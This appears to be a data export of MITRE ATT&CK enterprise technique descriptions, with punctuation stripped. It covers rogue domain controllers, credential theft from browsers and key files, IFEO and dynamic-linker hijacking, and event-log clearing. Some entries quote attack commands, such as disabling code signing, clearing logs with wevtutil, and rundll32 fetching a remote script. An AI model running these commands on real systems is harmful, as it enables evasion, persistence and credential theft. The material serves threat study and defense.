attack-pattern--564998d8-ab3e-4123-93fb-eccaa6b9714a,['enterprise-attack'],['T1207'],Rogue Domain Controller,adversaries may register a rogue domain controller to enable manipulation of active directory data  dcshadow may be used to create a rogue domain controller  dc   dcshadow is a method of manipulating active directory  ad  data  including objects and schemas  by registering  or reusing an inactive registration  and simulating the behavior of a dc   citation  dcshadow blog  once registered  a rogue dc may be able to inject and replicate changes into ad infrastructure for any domain object  including credentials and keys_  registering a rogue dc involves creating a new server and ntdsdsa objects in the configuration partition of the ad schema  which requires administrator privileges  either domain or local to the dc  or the krbtgt hash   citation  adsecurity mimikatz guide   this technique may bypass system logging and security monitors such as security information and event management  siem  products  since actions taken on a rogue dc may not be reported to these sensors    citation  dcshadow blog  the technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis  adversaries may also utilize this technique to perform  sid history  and or manipulate ad objects  such as accounts  access control lists  schemas  to establish backdoors for persistence   citation  dcshadow blog 
attack-pattern--565275d5-fcc3-4b66-b4e7-928e4cac6b8c,['enterprise-attack'],['T1553.006'],Code Signing Policy Modification,adversaries may modify code signing policies to enable execution of unsigned or self signed code  code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with  security controls can include enforcement mechanisms to ensure that only valid  signed code can be run on an operating system    some of these security controls may be enabled by default  such as driver signature enforcement  dse  on windows or system integrity protection  sip  on macos_ citation  microsoft dse june       citation  apple disable sip  other such controls may be disabled by default but are configurable through application controls  such as only allowing signed dynamic link libraries  dlls  to execute on a system  since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications  disabling of these features may be possible with elevated permissions_ citation  microsoft unsigned driver apr       citation  apple disable sip   adversaries may modify code signing policies in a number of ways  including through use of command line or gui utilities   modify  rebooting the computer in a debug recovery mode  or by altering the value of variables in kernel memory_ citation  microsoft testsigning feb       citation  apple disable sip  citation  fireeye hikit rootkit part    citation  github turla driver loader  examples of commands that can modify the code signing policy of a system include bcdedit_exe  set testsigning on on windows and csrutil disable on macos_ citation  microsoft testsigning feb       citation  apple disable sip  depending on the implementation  successful modification of a signing policy may require reboot of the compromised system  additionally  some implementations can introduce visible artifacts for the user  ex  a watermark in the corner of the screen stating the system is in test mode   adversaries may attempt to remove such artifacts_ citation  f secure blackenergy        to gain access to kernel memory to modify variables related to signature checks  such as modifying g_cioptions to disable driver signature enforcement  adversaries may conduct  exploitation for privilege  using a signed  but vulnerable driver_ citation  unit   acidbox june       citation  github turla driver loader 
attack-pattern--56e0d8b8-3e25-49dd-9050-3aa252f5aa92,['enterprise-attack'],['T1610'],Deploy Container,adversaries may deploy a container into an environment to facilitate execution or evade defenses  in some cases  adversaries may deploy a new container to execute processes associated with a particular image or deployment  such as processes that execute or download malware  in others  an adversary may deploy a new container configured without network rules  user limitations  etc  to bypass existing defenses within the environment_  containers can be deployed by various means  such as via docker's create and start apis or via a web application such as the kubernetes dashboard or kubeflow_ citation  docker containers api  citation  kubernetes dashboard  citation  kubeflow pipelines  adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime_ citation  aqua build images on hosts 
attack-pattern--56fca983-1cf1-4fd1-bda0-5e170a37ab59,['enterprise-attack'],['T1107'],File Deletion,adversaries may delete files left behind by the actions of their intrusion activity  malware  tools  or other non native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how  removal of these files can occur during an intrusion  or as part of a post intrusion process to minimize the adversary's footprint_  there are tools available from the host operating system to perform cleanup  but adversaries may use other tools as well  examples include native  functions such as del  secure deletion tools such as windows sysinternals sdelete  or other third party file deletion tools   citation  trend micro apt attack tools 
attack-pattern--56ff457d-5e39-492b-974c-dfd2b8603ffe,['enterprise-attack'],['T1145'],Private Keys,private cryptographic keys and certificates are used for authentication  encryption decryption  and digital signatures   citation  wikipedia public key crypto   adversaries may gather private keys from compromised systems for use in authenticating to  remote  like ssh or for use in decrypting other collected files such as email  common key and certificate file extensions include  _key  _pgp  _gpg  _ppk_  _p    _pem  _pfx  _cer  _p b  _asc  adversaries may also look in common key directories  such as   _ssh for ssh keys on   nix based systems or c  users  username  _ssh  on windows_  private keys should require a password or passphrase for operation  so an adversary may also use  input  for keylogging or attempt to  brute  the passphrase off line_  adversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates   citation  kaspersky careto   citation  palo alto prince of persia 
attack-pattern--57340c81-c025-4189-8fa0-fc7ede51bae4,['enterprise-attack'],['T1112'],Modify Registry,adversaries may interact with the windows registry to hide configuration information within registry keys  remove information as part of cleaning up  or as part of other techniques to aid in persistence and execution_  access to specific areas of the registry depends on account permissions  some requiring administrator level access  the built in windows command line utility  may be used for local or remote registry modification   citation  microsoft reg  other tools may also be used  such as a remote access tool  which may contain functionality to interact with the registry through the windows api_  registry modifications may also include actions to hide keys  such as prepending key names with a null character  which will cause an error and or be ignored when read via  or other utilities using the win   api   citation  microsoft reghide nov       adversaries may abuse these pseudo hidden keys to conceal payloads commands used to maintain persistence   citation  trendmicro poweliks aug        citation  spectorops hiding reg jul        the registry of a remote system may be modified to aid in execution of files as part of lateral movement  it requires the remote registry service to be running on the target system   citation  microsoft remote  often  valid  are required  along with access to the remote system's  smb windows admin  for rpc communication 
attack-pattern--573ad264-1371-4ae0-8482-d2673b719dba,['enterprise-attack'],['T1543.004'],Launch Daemon,adversaries may create or modify launch daemons to execute malicious payloads as part of persistence  launch daemons are plist files used to interact with launchd  the service management framework used by macos  launch daemons require elevated privileges to install  are executed for every user on a system prior to login  and run in the background without the need for user interaction  during the macos initialization startup  the launchd process loads the parameters for launch on demand system level daemons from plist files found in  system library launchdaemons  and  library launchdaemons   required launch daemons parameters include a label to identify the task  program to provide a path to the executable  and runatload to specify when the task is run  launch daemons are often used to provide access to shared resources  updates to software  or conduct automation tasks_ citation  appledocs launch agent daemons  citation  methods of mac malware persistence  citation  launchd keywords for plists   adversaries may install a launch daemon configured to execute at startup by using the runatload parameter set to true and the program parameter set to the malicious executable path  the daemon name may be disguised by using a name from a related operating system or benign software  i_e   when the launch daemon is executed  the program inherits administrative permissions_ citation  osx malware detection   additionally  system configuration changes  such as the installation of third party package managing software  may cause folders such as usr local bin to become globally writeable  so  it is possible for poor configurations to allow an adversary to modify executables referenced by current launch daemon's plist files_ citation  launchdaemon hijacking  citation  sentinelone macos persist jun      
attack-pattern--57a3d31a-d04f-4663-b2da-7df8ec3f8c9d,['enterprise-attack'],['T1580'],Cloud Infrastructure Discovery,an adversary may attempt to discover infrastructure and resources that are available within an infrastructure as a service  iaas  environment  this includes compute service resources such as instances  virtual machines  and snapshots as well as resources of other services including the storage and database services_  cloud providers offer methods such as apis and commands issued through clis to serve information about infrastructure  for example  aws provides a describeinstances api within the amazon ec  api that can return information about one or more instances within an account  the listbuckets api that returns a list of all buckets owned by the authenticated sender of the request  the headbucket api to determine a bucket s existence along with access permissions of the request sender  or the getpublicaccessblock api to retrieve access block configuration for a bucket_ citation  amazon describe instance  citation  amazon describe instances api  citation  aws get public access block  citation  aws head bucket  similarly  gcp's cloud sdk cli provides the gcloud compute instances list command to list all google compute engine instances in a project  citation  google compute instances   and azure's cli command az vm list lists details of virtual machines_ citation  microsoft az cli  in addition to api commands  adversaries can utilize open source tools to discover cloud storage infrastructure through  wordlist  malwarebytes osint leaky buckets   hioureas   an adversary may enumerate resources using a compromised user's access keys to determine which are available to that user_ citation  expel io evil in aws  the discovery of these available resources may help adversaries determine their next steps in the cloud environment  such as establishing persistence_ citation  mandiant m trends      an adversary may also use this information to change the configuration to make the bucket publicly accessible  allowing data to be accessed without authentication  adversaries have also may use infrastructure discovery apis such as describedbinstances to determine size  owner  permissions  and network acls of database resources   citation  aws describe db instances  adversaries can use this information to determine the potential value of databases and discover the requirements to access them  unlike in  cloud service  this technique focuses on the discovery of components of the provided services rather than the services themselves 
attack-pattern--58a3e6aa-4453-4cc8-a51f-4befe80b31a8,['enterprise-attack'],['T1555.003'],Credentials from Web Browsers,adversaries may acquire credentials from web browsers by reading files specific to the target browser_ citation  talos olympic destroyer       web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future  web browsers typically store the credentials in an encrypted format within a credential store  however  methods exist to extract plaintext credentials from web browsers_  for example  on windows systems  encrypted credentials may be obtained from google chrome by reading a database file  appdata local google chrome user data default login data and executing a sql query  select action_url  username_value  password_value from logins   the plaintext password can then be obtained by passing the encrypted credentials to the windows api function cryptunprotectdata  which uses the victim s cached logon credentials as the decryption key_ citation  microsoft cryptunprotectdata april         adversaries have executed similar procedures for common web browsers such as firefox  safari  edge  etc_ citation  proofpoint vega credential stealer may       citation  fireeye hawkeye malware july       windows stores internet explorer and microsoft edge credentials in credential lockers managed by the  windows credential   adversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials_ citation  github mimikittenz july        after acquiring credentials from web browsers  adversaries may attempt to recycle the credentials across different systems and or accounts in order to expand access  this can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts  e_g  domain administrator  
attack-pattern--58af3705-8740-4c68-9329-ec015a7013c2,['enterprise-attack'],['T1574.008'],Path Interception by Search Order Hijacking,adversaries may execute their own malicious payloads by hijacking the search order used to load other programs  because some programs do not call other programs using the full path  adversaries may place their own file in the directory where the calling program is located  causing the operating system to launch their malicious software at the request of the calling program_  search order hijacking occurs when an adversary abuses the order in which windows searches for programs that are not given a path  unlike  dll search order  the search order differs depending on the method that is used to execute the program   citation  microsoft createprocess   citation  windows nt command shell   citation  microsoft winexec  however  it is common for windows to search in the directory of the initiating program before searching through the windows system directory  an adversary who finds a program vulnerable to search order hijacking  i_e_  a program that does not specify the path to an executable  may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory_  for example   example_exe  runs  cmd_exe  with the command line argument net user  an adversary may place a program called  net_exe  within the same directory as example_exe   net_exe  will be run instead of the windows system utility net  in addition  if an adversary places a program called  net_com  in the same directory as  net_exe   then cmd_exe  c net user will execute  net_com  instead of  net_exe  due to the order of executable extensions defined under pathext   citation  microsoft environment property   search order hijacking is also a common practice for hijacking dll loads and is covered in  dll search order
attack-pattern--5909f20f-3c39-4795-be06-ef1ea40d350b,['enterprise-attack'],['T1491'],Defacement,adversaries may modify visual content available internally or externally to an enterprise network  thus affecting the integrity of the original content  reasons for  include delivering messaging  intimidation  or claiming  possibly false  credit for an intrusion  disturbing or offensive images may be used as a part of  in order to cause user discomfort  or to pressure compliance with accompanying messages 
attack-pattern--59bd0dec-f8b2-4b9a-9141-37a1e6899761,['enterprise-attack'],['T1535'],Unused/Unsupported Cloud Regions,adversaries may create cloud instances in unused geographic service regions in order to evade detection  access is usually obtained through compromising accounts used to manage cloud infrastructure_  cloud service providers often provide infrastructure throughout the world in order to improve performance  provide redundancy  and allow customers to meet compliance requirements  oftentimes  a customer will only use a subset of the available regions and may not actively monitor other regions  if an adversary creates resources in an unused region  they may be able to operate undetected_  a variation on this behavior takes advantage of differences in functionality across cloud regions  an adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity_  an example of adversary use of unused aws regions is to mine cryptocurrency through  resource  which can cost organizations substantial amounts of money over time depending on the processing power used_ citation  cloudsploit   unused aws regions 
attack-pattern--59ff91cd-1430-4075-8563-e6f15f4f9ff5,['enterprise-attack'],['T1557.003'],DHCP Spoofing,adversaries may redirect network traffic to adversary owned systems by spoofing dynamic host configuration protocol  dhcp  traffic and acting as a malicious dhcp server on the victim network  by achieving the adversary in the middle  aitm  position  adversaries may collect network communications  including passed credentials  especially those sent over insecure  unencrypted protocols  this may also enable follow on behaviors such as  network  or  transmitted data   dhcp is based on a client server model and has two functionalities  a protocol for providing network configuration settings from a dhcp server to a client and a mechanism for allocating network addresses to clients  the typical server client interaction is as follows       the client broadcasts a  discover  message_     the server responds with an  offer  message  which includes an available network address       the client broadcasts a  request  message  which includes the network address offered       the server acknowledges with an  ack  message and the client receives the network configuration parameters_  adversaries may spoof as a rogue dhcp server on the victim network  from which legitimate hosts may receive malicious network configurations  for example  malware can act as a dhcp server and provide adversary owned dns servers to the victimized computers  through the malicious network configurations  an adversary may achieve the aitm position  route client traffic through adversary controlled systems  and collect information from the client network_  dhcpv  clients can receive network configuration information without being assigned an ip address by sending a information request  code     message to the all_dhcp_relay_agents_and_servers multicast address  adversaries may use their rogue dhcp server to respond to this request message with malicious network configurations_  rather than establishing an aitm position  adversaries may also abuse dhcp spoofing to perform a dhcp exhaustion attack  i_e   service exhaustion  by generating many broadcast discover messages to exhaust a network s dhcp allocation pool 
attack-pattern--5ad95aaa-49c1-4784-821d-2e83f47b079b,['enterprise-attack'],['T1155'],AppleScript,macos and os x applications send appleevent messages to each other for interprocess communications  ipc   these messages can be easily scripted with applescript for local or remote ipc  osascript executes applescript and any other open scripting architecture  osa  language scripts  a list of osa languages installed on a system can be found by using the osalang program_ appleevent messages can be sent independently or as part of a script  these events can locate open windows  send keystrokes  and interact with almost any open application locally or remotely    adversaries can use this to interact with open ssh connection  move to remote machines  and even present users with fake dialog boxes  these events cannot start applications remotely  they can start them locally though   but can interact with applications if they're already running remotely  since this is a scripting language  it can be used to launch more common techniques as well such as a reverse shell via python   citation  macro malware targets macs   scripts can be run from the command line via osascript  path to script or osascript  e  script here  
attack-pattern--5b0ad6f8-6a16-4966-a4ef-d09ea6e2a9f5,['enterprise-attack'],['T1563'],Remote Service Session Hijacking,adversaries may take control of preexisting sessions with remote services to move laterally in an environment  users may use valid credentials to log into a service specifically designed to accept remote connections  such as telnet  ssh  and rdp  when a user logs into a service  a session will be established that will allow them to maintain a continuous interaction with that service_  adversaries may commandeer these sessions to carry out actions on remote systems   remote service session  differs from use of  remote  because it hijacks an existing session rather than creating a new session using  valid  rdp hijacking medium  citation  breach post mortem ssh hijack 
attack-pattern--5bfccc3f-2326-4112-86cc-c1ece9d8a2b5,['enterprise-attack'],['T1027.001'],Binary Padding,adversaries may use binary padding to add junk data and change the on disk representation of malware  this can be done without affecting the functionality or behavior of a binary  but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations    binary padding effectively changes the checksum of the file and can also be used to avoid hash based blocklists and static anti virus signatures_ citation  eset oceanlotus  the padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware_ citation  securelist malware tricks april       increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files  this may also reduce the likelihood of being collected for analysis  public file scanning services  such as virustotal  limits the maximum size of an uploaded file to be analyzed_ citation  virustotal faq 
attack-pattern--5d0d3609-d06d-49e1-b9c9-b544e0c618cb,['enterprise-attack'],['T1505.003'],Web Shell,adversaries may backdoor web servers with web shells to establish persistent access to systems  a web shell is a web script that is placed on an openly accessible web server to allow an adversary to use the web server as a gateway into a network  a web shell may provide a set of functions to execute or a command line interface on the system that hosts the web server_  in addition to a server side script  a web shell may have a client interface program that is used to talk to the web server  e_g   china  web shell client _ citation  lee      
attack-pattern--5d2be8b9-d24c-4e98-83bf-2f5f79477163,['enterprise-attack'],['T1484.001'],Group Policy Modification,adversaries may modify group policy objects  gpos  to subvert the intended discretionary access controls for a domain  usually with the intention of escalating privileges on the domain  group policy allows for centralized management of user and computer settings in active directory  ad   gpos are containers for group policy settings made up of files stored within a predicable network path    lt domain gt  sysvol  lt domain gt  policies _ citation  technet group policy basics  citation  adsecurity gpo persistence         like other objects in ad  gpos have access controls associated with them  by default all user accounts in the domain have permission to read gpos  it is possible to delegate gpo access control permissions  e_g  write access  to specific users or groups in the domain_  malicious gpo modifications can be used to implement many other malicious behaviors such as  scheduled   disable or modify   ingress tool   create   service   and more_ citation  adsecurity gpo persistence       citation  wald  guide to gpos  citation  harmj y abusing gpo permissions  citation  mandiant m trends       citation  microsoft hacking team breach  since gpos can control so many user and machine settings in the ad environment  there are a great number of potential attacks that can stem from this gpo abuse_ citation  wald  guide to gpos   for example  publicly available scripts such as new gpoimmediatetask can be leveraged to automate the creation of a malicious  scheduled  by modifying gpo settings  in this case modifying  lt gpo_path gt  machine preferences scheduledtasks scheduledtasks_xml_ citation  wald  guide to gpos  citation  harmj y abusing gpo permissions  in some cases an adversary might modify specific user rights like seenabledelegationprivilege  set in  lt gpo_path gt  machine microsoft windows nt secedit gpttmpl_inf  to achieve a subtle ad backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify gpos_ citation  harmj y seenabledelegationprivilege right 
attack-pattern--5e4a2073-9643-44cb-a0b5-e7f4048446c7,['enterprise-attack'],['T1217'],Browser Bookmark Discovery,adversaries may enumerate browser bookmarks to learn more about compromised hosts  browser bookmarks may reveal personal information about users  ex  banking sites  interests  social media  etc_  as well as details about internal network resources such as servers  tools dashboards  or other related infrastructure_  browser bookmarks may also highlight additional targets after an adversary has access to valid credentials  especially  credentials in  associated with logins cached by a browser_  specific storage locations vary based on platform and or application  but browser bookmarks are typically stored in local files databases 
attack-pattern--60b508a1-6a5e-46b1-821a-9f7b78752abf,['enterprise-attack'],['T1552.004'],Private Keys,adversaries may search for private key certificate files on compromised systems for insecurely stored credentials  private cryptographic keys and certificates are used for authentication  encryption decryption  and digital signatures_ citation  wikipedia public key crypto  common key and certificate file extensions include  _key  _pgp  _gpg  _ppk_  _p    _pem  _pfx  _cer  _p b  _asc    adversaries may also look in common key directories  such as   _ssh for ssh keys on   nix based systems or c      users      username      _ssh      on windows  these private keys can be used to authenticate to  remote  like ssh or for use in decrypting other collected files such as email_  adversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates_ citation  kaspersky careto  citation  palo alto prince of persia   some private keys require a password or passphrase for operation  so an adversary may also use  input  for keylogging or attempt to  brute  the passphrase off line 
attack-pattern--60c4b628-4807-4b0b-bbf5-fdac8643c337,['enterprise-attack'],['T1583.004'],Server,adversaries may buy  lease  or rent physical servers that can be used during targeting  use of servers allows an adversary to stage  launch  and execute an operation  during post compromise activity  adversaries may utilize servers for various tasks  including for command and control  instead of compromising a third party  or renting a  virtual private  adversaries may opt to configure and run their own servers in support of operations_  adversaries may only need a lightweight setup if most of their activities will take place using online infrastructure  or  they may need to build extensive infrastructure if they want to test  communicate  and control other aspects of their activities on their own systems 
attack-pattern--60d0c01d-e2bf-49dd-a453-f8a9c9fa6f65,['enterprise-attack'],['T1021.006'],Windows Remote Management,adversaries may use  valid  to interact with remote systems using windows remote management  winrm   the adversary may then perform actions as the logged on user_  winrm is the name of both a windows service and a protocol that allows a user to interact with a remote system  e_g_  run an executable  modify the registry  modify services _ citation  microsoft winrm  it may be called with the  winrm  command or by any number of programs such as powershell_ citation  jacobsen       winrm  can be used as a method of remotely interacting with  windows management  msdn wmi 
attack-pattern--613d08bc-e8f4-4791-80b0-c8b974340dfd,['enterprise-attack'],['T1011.001'],Exfiltration Over Bluetooth,adversaries may attempt to exfiltrate data over bluetooth rather than the command and control channel  if the command and control network is a wired internet connection  an adversary may opt to exfiltrate data using a bluetooth communication channel_  adversaries may choose to do this if they have sufficient access and proximity  bluetooth connections might not be secured or defended as well as the primary internet connected channel because it is not routed through the same enterprise network 
attack-pattern--6151cbea-819b-455a-9fa6-99a1cc58797d,['enterprise-attack'],['T1078.001'],Default Accounts,adversaries may obtain and abuse credentials of a default account as a means of gaining initial access  persistence  privilege escalation  or defense evasion  default accounts are those that are built into an os  such as the guest or administrator accounts on windows systems  default accounts also include default factory provider set accounts on other types of systems  software  or devices  including the root user account in aws and the default service account in kubernetes_ citation  microsoft local accounts feb       citation  aws root user  citation  threat matrix for kubernetes   default accounts are not limited to client machines  rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal  open source  or commercial  appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation  as they are easy targets for an adversary  similarly  adversaries may also utilize publicly disclosed or stolen  private  or credential materials to legitimately connect to remote environments via  remote  metasploit ssh module 
attack-pattern--61afc315-860c-4364-825d-0d62b2e91edc,['enterprise-attack'],['T1547.003'],Time Providers,adversaries may abuse time providers to execute dlls when the system boots  the windows time service  w  time  enables time synchronization across and within domains_ citation  microsoft w  time feb       w  time time providers are responsible for retrieving time stamps from hardware network resources and outputting these values to other network clients_ citation  microsoft timeprovider   time providers are implemented as dynamic link libraries  dlls  that are registered in the subkeys of  hkey_local_machine system currentcontrolset services w  time timeproviders _ citation  microsoft timeprovider  the time provider manager  directed by the service control manager  loads and starts time providers listed and enabled under this key at system startup and or whenever parameters are changed_ citation  microsoft timeprovider   adversaries may abuse this architecture to establish persistence  specifically by registering and enabling a malicious dll as a time provider  administrator privileges are required for time provider registration  though execution will run in context of the local service account_ citation  github w  time oct      
attack-pattern--62166220-e498-410f-a90a-19d4339d4e99,['enterprise-attack'],['T1183'],Image File Execution Options Injection,image file execution options  ifeo  enable a developer to attach a debugger to an application  when a process is created  a debugger present in an application s ifeo will be prepended to the application s name  effectively launching the new process under the debugger  e_g_   c  dbg ntsd_exe  g  notepad_exe     citation  microsoft dev blog ifeo mar        ifeos can be set directly via the registry or in global flags via the gflags tool   citation  microsoft gflags mar       ifeos are represented as debugger values in the registry under hklm software  wow    node  microsoft windows nt currentversion image file execution options  where  is the binary on which the debugger is attached   citation  microsoft dev blog ifeo mar        ifeos can also enable an arbitrary monitor program to be launched when a specified program silently exits  i_e  is prematurely terminated by itself or a second  non kernel mode process    citation  microsoft silent process exit nov        citation  oddvar moe ifeo apr       similar to debuggers  silent exit monitoring can be enabled through gflags and or by directly modifying iefo and silent process exit registry values in hkey_local_machine software microsoft windows nt currentversion silentprocessexit    citation  microsoft silent process exit nov        citation  oddvar moe ifeo apr        an example where the evil_exe process is started when notepad_exe exits   citation  oddvar moe ifeo apr          reg add  hklm software microsoft windows nt currentversion image file execution options notepad_exe   v globalflag  t reg_dword  d       reg add  hklm software microsoft windows nt currentversion silentprocessexit notepad_exe   v reportingmode  t reg_dword  d     reg add  hklm software microsoft windows nt currentversion silentprocessexit notepad_exe   v monitorprocess  d  c  temp evil_exe   similar to  process  these values may be abused to obtain persistence and privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer   citation  elastic process injection july       installing ifeo mechanisms may also provide persistence via continuous invocation_  malware may also use ifeo for defense evasion by registering invalid debuggers that redirect and effectively disable various system and security applications   citation  fsecure hupigon   citation  symantec ushedix june      
attack-pattern--62b8c999-dcc0-4755-bd69-09442d9359f5,['enterprise-attack'],['T1085'],Rundll32,the rundll  _exe program can be called to execute an arbitrary binary  adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll  _exe process because of whitelists or false positives from windows using rundll  _exe for normal operations_  rundll  _exe can be used to execute control panel item files  _cpl  through the undocumented shell  _dll functions control_rundll and control_rundllasuser  double clicking a _cpl file also causes rundll  _exe to execute   citation  trend micro cpl   rundll   can also been used to execute scripts such as javascript  this can be done using a syntax similar to this  rundll  _exe javascript   __ mshtml runhtmlapplication   document_write   getobject  script https     www _ example _ com malicious_sct     this behavior has been seen used by malware such as poweliks   citation  this is security command line confusion 
attack-pattern--62dfd1ca-52d5-483c-a84b-d6e80bf94b7b,['enterprise-attack'],['T1031'],Modify Existing Service,windows service configuration information  including the file path to the service's executable or recovery programs commands  is stored in the registry  service configurations can be modified using utilities such as sc_exe and   adversaries can modify an existing service to persist malware on a system by using system utilities or by using custom tools to interact with the windows api  use of existing services is a type of  that may make detection analysis more challenging  modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used_  adversaries may also intentionally corrupt or kill services to execute malicious recovery programs commands   citation  twitter service recovery nov        citation  microsoft service recovery feb      
attack-pattern--63220765-d418-44de-8fae-694b3912317d,['enterprise-attack'],['T1546.005'],Trap,adversaries may establish persistence by executing malicious content triggered by an interrupt signal  the trap command allows programs and shells to specify commands that will be executed upon receiving interrupt signals  a common situation is a script allowing for graceful termination and handling of common keyboard interrupts like ctrl c and ctrl d_  adversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism  trap commands are of the following format trap 'command list' signals where  command list  will be executed when  signals  are received_ citation  trap manual  citation  cyberciti trap statements 
attack-pattern--633a100c-b2c9-41bf-9be5-905c1b16c825,['enterprise-attack'],['T1574.006'],Dynamic Linker Hijacking,adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries  during the execution preparation phase of a program  the dynamic linker loads specified absolute paths of shared libraries from environment variables and files  such as ld_preload on linux or dyld_insert_libraries on macos  libraries specified in environment variables are loaded first  taking precedence over system libraries with the same function name_ citation  man ld_so  citation  tldp shared libraries  citation  apple doco archive dynamic libraries  these variables are often used by developers to debug binaries without needing to recompile  deconflict mapped symbols  and implement custom functions without changing the original library_ citation  baeldung ld_preload   on linux and macos  hijacking dynamic linker variables may grant access to the victim process's memory  system network resources  and possibly elevated privileges  this method may also evade detection from security products since the execution is masked under a legitimate process  adversaries can set environment variables via the command line using the export command  setenv function  or putenv function  adversaries can also leverage  dynamic linker  to export variables in a shell or set variables programmatically using higher level syntax such python s os_environ_  on linux  adversaries may set ld_preload to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program  causing the operating system to load the adversary's malicious code upon execution of the victim program  ld_preload can be set via the environment variable or  etc ld_so_preload file_ citation  man ld_so  citation  tldp shared libraries  libraries specified by ld_preload are loaded and mapped into memory by dlopen   and mmap   respectively_ citation  code injection on linux and macos  citation  uninformed needle   citation  phrack halfdead       citation  brown exploiting linkers    on macos this behavior is conceptually the same as on linux  differing only in how the macos dynamic libraries  dyld  is implemented at a lower level  adversaries can set the dyld_insert_libraries environment variable to point to malicious libraries containing names of legitimate libraries or functions requested by a victim program_ citation  theevilbit dyld_insert_libraries  citation  timac dyld_insert_libraries  citation  gabilondo dyld_insert_libraries catalina bypass 
attack-pattern--635cbe30-392d-4e27-978e-66774357c762,['enterprise-attack'],['T1136.001'],Local Account,adversaries may create a local account to maintain access to victim systems  local accounts are those configured by an organization for use by users  remote support  services  or for administration on a single system or service  with a sufficient level of access  the net user  add command can be used to create a local account  on macos systems the dscl  create command can be used to create a local account_  such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system 
attack-pattern--64196062-5210-42c3-9a02-563a0d1797ef,['enterprise-attack'],['T1092'],Communication Through Removable Media,adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system  both systems would need to be compromised  with the likelihood that an internet connected system was compromised first and the second through lateral movement by  replication through removable  commands and files would be relayed from the disconnected system to the internet connected system to which the adversary has direct access 
attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2,['enterprise-attack'],['T1070.001'],Clear Windows Event Logs,adversaries may clear windows event logs to hide the activity of an intrusion  windows event logs are a record of a computer's alerts and notifications  there are three system defined sources of events  system  application  and security  with five event types  error  warning  information  success audit  and failure audit_  the event logs can be cleared with the following utility commands     wevtutil cl system   wevtutil cl application   wevtutil cl security  these logs may also be cleared through other mechanisms  such as the event viewer gui or
attack-pattern--65013dd2-bc61-43e3-afb5-a14c4fa7437a,['enterprise-attack'],['T1585.002'],Email Accounts,adversaries may create email accounts that can be used during targeting  adversaries can use accounts created with email providers to further their operations  such as leveraging them to conduct  phishing for  or  mandiant apt   adversaries may also take steps to cultivate a persona around the email account  such as through use of  social media  to increase the chance of success of follow on behaviors  created email accounts can also be used in the acquisition of infrastructure  ex   mandiant apt    to decrease the chance of physically tying back operations to themselves  adversaries may make use of disposable email services_ citation  trend micro r         
attack-pattern--650c784b-7504-4df7-ab2c-4ea882384d1e,['enterprise-attack'],['T1557.001'],LLMNR/NBT-NS Poisoning and SMB Relay,by responding to llmnr nbt ns network traffic  adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system  this activity may be used to collect or relay authentication materials    link local multicast name resolution  llmnr  and netbios name service  nbt ns  are microsoft windows components that serve as alternate methods of host identification  llmnr is based upon the domain name system  dns  format and allows hosts on the same local link to perform name resolution for other hosts  nbt ns identifies systems on a local network by their netbios name   citation  wikipedia llmnr  citation  technet netbios   adversaries can spoof an authoritative source for name resolution on a victim network by responding to llmnr  udp       nbt ns  udp      traffic as if they know the identity of the requested host  effectively poisoning the service so that the victims will communicate with the adversary controlled system  if the requested host belongs to a resource that requires identification authentication  the username and ntlmv  hash will then be sent to the adversary controlled system  the adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through  network  and crack the hashes offline through  brute  to obtain the plaintext passwords_  in some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system  the ntlmv  hashes can be intercepted and relayed to access and execute code against a target system  the relay step can happen in conjunction with poisoning but may also be independent of it_ citation  byt bl  d r ntlm relaying  citation  secure ideas smb relay  additionally  adversaries may encapsulate the ntlmv  v  hashes into various protocols  such as ldap  smb  mssql and http  to expand and use multiple services with the valid ntlm response_   several tools may be used to poison name services within local networks such as nbnspoof  metasploit  and  github nbnspoof  citation  rapid  llmnr spoofer  citation  github responder 
attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196,['enterprise-attack'],['T1222'],File and Directory Permissions Modification,adversaries may modify file or directory permissions attributes to evade access control lists  acls  and access protected files_ citation  hybrid analysis icacls  june       citation  hybrid analysis icacls  may       file and directory permissions are commonly managed by acls configured by the file or directory owner  or users with the appropriate permissions  file and directory acl implementations vary by platform  but generally explicitly designate which users or groups can perform which actions  read  write  execute  etc_ _  modifications may include changing specific access rights  which may require taking ownership of a file or directory and or elevated permissions depending on the file or directory s existing permissions  this may enable malicious activity such as modifying  replacing  or deleting specific files or directories  specific file and directory modifications may be a required step for many techniques  such as establishing persistence via  accessibility   boot or logon initialization   unix shell configuration  or tainting hijacking other instrumental binary configuration files via  hijack execution   adversaries may also change permissions of symbolic links  for example  malware  particularly ransomware  may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths 
